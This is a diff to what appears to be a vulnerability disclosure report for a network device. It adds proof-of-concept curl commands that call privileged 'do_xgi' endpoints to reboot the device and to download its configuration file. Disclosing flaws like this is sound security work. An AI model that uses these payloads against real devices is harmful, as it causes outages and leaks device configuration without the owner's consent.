@@ -32,8 +32,22 @@ In `do_xgi`, there are privileged functions, which schedule the reboot of the de
 
 ## POC
 
+### reboot
+
 The following payload will reboot the device, assume the IP address of the device is `192.168.1.1`
 
 ```shell
 curl -X GET "192.168.1.1/graphic/reboot.xgi?a=1"
 ```
+
+### information leakage
+
+And the following payload leak the config information of the device
+
+```shell
+curl -X GET "192.168.1.1/graphic/config.xgi?a=1" --output ./test.bin
+```
+
+The result is as follows, some content has been encrypted by the device.
+
+![image-20241127210412134](report/image-20241127210412134.png)
